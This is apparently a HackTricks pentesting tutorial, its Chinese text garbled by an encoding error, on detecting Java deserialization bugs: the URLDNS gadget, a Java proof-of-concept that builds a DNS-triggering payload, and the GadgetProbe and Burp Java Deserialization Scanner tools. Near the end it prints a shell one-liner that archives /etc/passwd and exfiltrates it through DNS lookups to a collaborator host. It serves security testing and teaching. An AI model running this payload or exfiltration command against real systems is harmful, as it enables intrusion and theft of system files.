# Java DNSååºåˆ—åŒ–ã€GadgetProbeå’ŒJavaååºåˆ—åŒ–æ‰«æå™¨

## Java DNSååºåˆ—åŒ–ã€GadgetProbeå’ŒJavaååºåˆ—åŒ–æ‰«æå™¨

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ååºåˆ—åŒ–çš„DNSè¯·æ±‚

ç±»`java.net.URL`å®ç°äº†`Serializable`æ¥å£ï¼Œè¿™æ„å‘³ç€è¯¥ç±»å¯ä»¥è¢«åºåˆ—åŒ–ã€‚
```java
public final class URL implements java.io.Serializable {
```
è¿™ä¸ªç±»æœ‰ä¸€ä¸ªå¥‡æ€ªçš„è¡Œä¸ºã€‚æ ¹æ®æ–‡æ¡£ï¼šâ€œå¦‚æœä¸¤ä¸ªä¸»æœºåéƒ½å¯ä»¥è§£æä¸ºç›¸åŒçš„IPåœ°å€ï¼Œåˆ™è®¤ä¸ºä¸¤ä¸ªä¸»æœºæ˜¯ç­‰æ•ˆçš„â€ã€‚\
å› æ­¤ï¼Œæ¯å½“ä¸€ä¸ªURLå¯¹è±¡è°ƒç”¨`equals`æˆ–`hashCode`å‡½æ•°æ—¶ï¼Œéƒ½ä¼šå‘é€ä¸€ä¸ªDNSè¯·æ±‚æ¥è·å–IPåœ°å€ã€‚

ä»ä¸€ä¸ªURLå¯¹è±¡è°ƒç”¨`hashCode`å‡½æ•°éå¸¸ç®€å•ï¼Œåªéœ€è¦å°†è¯¥å¯¹è±¡æ’å…¥åˆ°å°†è¦è¢«ååºåˆ—åŒ–çš„HashMapä¸­å³å¯ã€‚è¿™æ˜¯å› ä¸ºåœ¨HashMapçš„`readObject`å‡½æ•°çš„æœ«å°¾ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
å®ƒå°†å¯¹`HashMap`ä¸­çš„æ¯ä¸ªå€¼æ‰§è¡Œ`putVal`ã€‚ä½†æ›´é‡è¦çš„æ˜¯å¯¹æ¯ä¸ªå€¼è°ƒç”¨`hash`å‡½æ•°ã€‚è¿™æ˜¯`hash`å‡½æ•°çš„ä»£ç ï¼š
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
æ­£å¦‚ä½ æ‰€è§‚å¯Ÿåˆ°çš„ï¼Œå½“å¯¹HashMapè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå‡½æ•°`hash`å°†å¯¹æ¯ä¸ªå¯¹è±¡è¿›è¡Œæ‰§è¡Œï¼Œå¹¶åœ¨`hash`æ‰§è¡ŒæœŸé—´æ‰§è¡Œå¯¹è±¡çš„`.hashCode()`ã€‚å› æ­¤ï¼Œå¦‚æœä½ ååºåˆ—åŒ–ä¸€ä¸ªåŒ…å«URLå¯¹è±¡çš„HashMapï¼ŒURLå¯¹è±¡å°†æ‰§è¡Œ`.hashCode()`ã€‚

ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹`URLObject.hashCode()`çš„ä»£ç ï¼š
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œå½“ä¸€ä¸ª`URLObject`æ‰§è¡Œ`.hashCode()`æ—¶ï¼Œå®ƒè¢«ç§°ä¸º`hashCode(this)`ã€‚æ¥ä¸‹æ¥ä½ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼š
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
ä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ª`getHostAddress`è¢«æ‰§è¡Œåˆ°è¯¥åŸŸåï¼Œ**å‘èµ·äº†ä¸€ä¸ªDNSæŸ¥è¯¢**ã€‚

å› æ­¤ï¼Œå¯ä»¥æ»¥ç”¨è¿™ä¸ªç±»æ¥**å‘èµ·**ä¸€ä¸ª**DNSæŸ¥è¯¢**æ¥**è¯æ˜**ååºåˆ—åŒ–æ˜¯å¯èƒ½çš„ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥**æ³„éœ²ä¿¡æ¯**ï¼ˆä½ å¯ä»¥å°†å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºä½œä¸ºå­åŸŸåé™„åŠ ä¸Šå»ï¼‰ã€‚

### URLDNS payload ä»£ç ç¤ºä¾‹

ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°[ysoserialä¸­çš„URDNS payloadä»£ç ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ã€‚ç„¶è€Œï¼Œä¸ºäº†æ›´å®¹æ˜“ç†è§£å¦‚ä½•ç¼–å†™ä»£ç ï¼Œæˆ‘åˆ›å»ºäº†è‡ªå·±çš„PoCï¼ˆåŸºäºysoserialçš„ä»£ç ï¼‰ï¼š
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### æ›´å¤šä¿¡æ¯

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* åœ¨åŸå§‹æƒ³æ³•ä¸­ï¼Œcommons collectionsè´Ÿè½½å·²æ›´æ”¹ä¸ºæ‰§è¡ŒDNSæŸ¥è¯¢ï¼Œè¿™æ¯”æè®®çš„æ–¹æ³•ä¸å¤ªå¯é ï¼Œä½†è¿™æ˜¯å¸–å­ï¼š[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

æ‚¨å¯ä»¥ä»Burp Suiteåº”ç”¨å•†åº—ï¼ˆExtenderï¼‰ä¸‹è½½[**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)ã€‚

**GadgetProbe**å°†å°è¯•ç¡®å®šæœåŠ¡å™¨çš„Javaç±»æ˜¯å¦å­˜åœ¨ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥çŸ¥é“å®ƒæ˜¯å¦å®¹æ˜“å—åˆ°æŸäº›å·²çŸ¥æ¼æ´çš„æ”»å‡»ã€‚

### å·¥ä½œåŸç†

**GadgetProbe**å°†ä½¿ç”¨å‰ä¸€èŠ‚ä¸­çš„**DNSè´Ÿè½½**ï¼Œä½†åœ¨è¿è¡ŒDNSæŸ¥è¯¢ä¹‹å‰ï¼Œå®ƒå°†**å°è¯•ååºåˆ—åŒ–ä»»æ„ç±»**ã€‚å¦‚æœ**ä»»æ„ç±»å­˜åœ¨**ï¼Œåˆ™å°†å‘é€**DNSæŸ¥è¯¢**ï¼Œå¹¶ä¸”GadgProbeå°†è®°å½•æ­¤ç±»çš„å­˜åœ¨ã€‚å¦‚æœ**ä»æœªå‘é€DNS**è¯·æ±‚ï¼Œåˆ™æ„å‘³ç€**ä»»æ„ç±»æœªæˆåŠŸååºåˆ—åŒ–**ï¼Œå› æ­¤è¦ä¹ˆä¸å­˜åœ¨ï¼Œè¦ä¹ˆ**ä¸å¯åºåˆ—åŒ–/å¯åˆ©ç”¨**ã€‚

åœ¨githubä¸­ï¼Œ[**GadgetProbeæœ‰ä¸€äº›å•è¯åˆ—è¡¨**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)ï¼Œå…¶ä¸­åŒ…å«è¦è¿›è¡Œæµ‹è¯•çš„Javaç±»ã€‚

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### æ›´å¤šä¿¡æ¯

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Javaååºåˆ—åŒ–æ‰«æå™¨

å¯ä»¥ä»Burp App Storeï¼ˆExtenderï¼‰ä¸‹è½½æ­¤æ‰«æå™¨ã€‚
è¯¥**æ‰©å±•**å…·æœ‰**è¢«åŠ¨**å’Œ**ä¸»åŠ¨**çš„**åŠŸèƒ½**ã€‚

### è¢«åŠ¨

é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼š**è¢«åŠ¨åœ°æ£€æŸ¥**æ‰€æœ‰å‘é€çš„è¯·æ±‚å’Œå“åº”ï¼Œ**æŸ¥æ‰¾**æ˜¯å¦å­˜åœ¨**Javaåºåˆ—åŒ–çš„é­”æœ¯å­—èŠ‚**ï¼Œå¦‚æœæ‰¾åˆ°ä»»ä½•ä¸€ä¸ªï¼Œå°†æ˜¾ç¤ºæ¼æ´è­¦å‘Šï¼š

![](<../../.gitbook/assets/image (290).png>)

### ä¸»åŠ¨

**æ‰‹åŠ¨æµ‹è¯•**

æ‚¨å¯ä»¥é€‰æ‹©ä¸€ä¸ªè¯·æ±‚ï¼Œå³é”®å•å‡»å¹¶é€‰æ‹©`Send request to DS - Manual Testing`ã€‚
ç„¶åï¼Œåœ¨_Deserialization Scanner Tab_ --> _Manual testing tab_ä¸­ï¼Œæ‚¨å¯ä»¥é€‰æ‹©**æ’å…¥ç‚¹**ã€‚ç„¶åï¼Œ**å¯åŠ¨æµ‹è¯•**ï¼ˆæ ¹æ®ä½¿ç”¨çš„ç¼–ç é€‰æ‹©é€‚å½“çš„æ”»å‡»ï¼‰ã€‚

![](../../.gitbook/assets/3-1.png)

å³ä½¿è¿™è¢«ç§°ä¸ºâ€œæ‰‹åŠ¨æµ‹è¯•â€ï¼Œå®ƒæ˜¯ç›¸å½“**è‡ªåŠ¨åŒ–**çš„ã€‚å®ƒå°†è‡ªåŠ¨æ£€æŸ¥**ååºåˆ—åŒ–**æ˜¯å¦**å®¹æ˜“å—åˆ°ä»»ä½•ysoserialè´Ÿè½½**çš„æ”»å‡»ï¼Œæ£€æŸ¥WebæœåŠ¡å™¨ä¸Šå­˜åœ¨çš„åº“ï¼Œå¹¶çªå‡ºæ˜¾ç¤ºæ˜“å—æ”»å‡»çš„åº“ã€‚ä¸ºäº†**æ£€æŸ¥æ˜“å—æ”»å‡»çš„åº“**ï¼Œæ‚¨å¯ä»¥é€‰æ‹©å¯åŠ¨**Javas Sleeps**ï¼Œé€šè¿‡**CPU**æ¶ˆè€—è¿›è¡Œ**sleeps**ï¼Œæˆ–è€…ä½¿ç”¨**DNS**ï¼Œæ­£å¦‚å…ˆå‰æåˆ°çš„é‚£æ ·ã€‚

**åˆ©ç”¨**

ä¸€æ—¦æ‚¨ç¡®å®šäº†æ˜“å—æ”»å‡»çš„åº“ï¼Œå¯ä»¥å°†è¯·æ±‚å‘é€åˆ°_Exploiting Tab_ã€‚
åœ¨æ­¤é€‰é¡¹å¡ä¸­ï¼Œæ‚¨å¿…é¡»å†æ¬¡**é€‰æ‹©æ³¨å…¥ç‚¹**ï¼Œå¹¶**ç¼–å†™**è¦ä¸ºå…¶åˆ›å»ºæœ‰æ•ˆè´Ÿè½½çš„**æ˜“å—æ”»å‡»çš„åº“**å’Œ**å‘½ä»¤**ã€‚ç„¶åï¼Œåªéœ€æŒ‰ä¸‹é€‚å½“çš„**Attack**æŒ‰é’®ã€‚

![](<../../.gitbook/assets/4 (1).png>)

### Javaååºåˆ—åŒ–DNS Exfilä¿¡æ¯

ä½¿æ‚¨çš„è´Ÿè½½æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### æ›´å¤šä¿¡æ¯

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
